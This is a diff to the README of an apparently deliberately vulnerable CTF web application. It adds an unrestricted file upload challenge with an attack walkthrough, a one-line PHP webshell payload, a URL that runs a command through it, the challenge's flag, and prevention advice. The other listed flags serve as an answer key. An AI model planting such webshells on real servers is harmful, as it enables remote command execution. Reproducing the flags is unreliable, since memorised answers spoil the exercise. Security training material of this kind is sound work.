@@ -23,6 +23,7 @@ This is a deliberately vulnerable web application for CTF competitions. It conta
 | 10 | CSRF | Web | Medium | `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}` |
 | 11 | SSTI | Web | Hard | `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}` |
 | 12 | JWT Vulnerabilities | Web | Hard | `CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}` |
+| 13 | Unrestricted File Upload | Web | Medium | `CCEE{unr3str1ct3d_f1l3_upl04d_rce}` |
 
 ---
 
@@ -214,6 +215,34 @@ curl http://target/api/auth.php?action=profile \
 
 ---
 
+### 12. Unrestricted File Upload (Medium) ✅ VERIFIED
+**Location:** `careers.php`  
+**Vulnerability:** No file type validation, uploads stored in web-accessible directory  
+
+**Attack Steps:**
+1. Go to Careers page (`/challenge/careers.php`)
+2. Create a PHP webshell: `<?php system($_GET['cmd']); ?>`
+3. Save as `shell.php` and upload via resume field
+4. Access: `http://target/challenge/uploads/shell.php?cmd=cat includes/upload_flag.txt`
+5. Flag is returned!
+
+**Example Payloads:**
+```php
+<?php system($_GET['cmd']); ?>              // Basic shell
+<?php echo file_get_contents('includes/upload_flag.txt'); ?>  // Direct flag read
+```
+
+**Flag:** `CCEE{unr3str1ct3d_f1l3_upl04d_rce}`
+
+**Prevention:**
+- Validate file extensions (whitelist approach)
+- Check MIME types
+- Store uploads outside webroot
+- Rename uploaded files
+- Disable PHP execution in upload directory
+
+---
+
 ## Files Structure
 
 ```
@@ -223,7 +252,7 @@ challenge/
 ├── services.php           # Services page
 ├── shop.php               # Logic flaw vulnerability
 ├── contact.php            # Contact form
-├── careers.php            # File upload (optional)
+├── careers.php            # Unrestricted File Upload vulnerability
 ├── login.php              # PHP Object Injection
 ├── login_legacy.php       # SQL Injection
 ├── logout.php             # Logout handler
@@ -243,7 +272,8 @@ challenge/
 │   ├── config.php         # Database config + flag
 │   ├── header.php         # Site header
 │   ├── footer.php         # Site footer
-│   └── ssti_flag.txt      # SSTI challenge flag (NEW)
+│   ├── ssti_flag.txt      # SSTI challenge flag
+│   └── upload_flag.txt    # File Upload challenge flag (NEW)
 ├── exploits/
 │   └── csrf_exploit.html  # Example CSRF exploit (NEW)
 └── css/
@@ -283,8 +313,9 @@ challenge/
 | PHP Object Injection | 200 |
 | SSTI | 250 |
 | JWT Vulnerabilities | 250 |
+| Unrestricted File Upload | 150 |
 
-**Total: 1600 points**
+**Total: 1750 points**
 
 ---
 
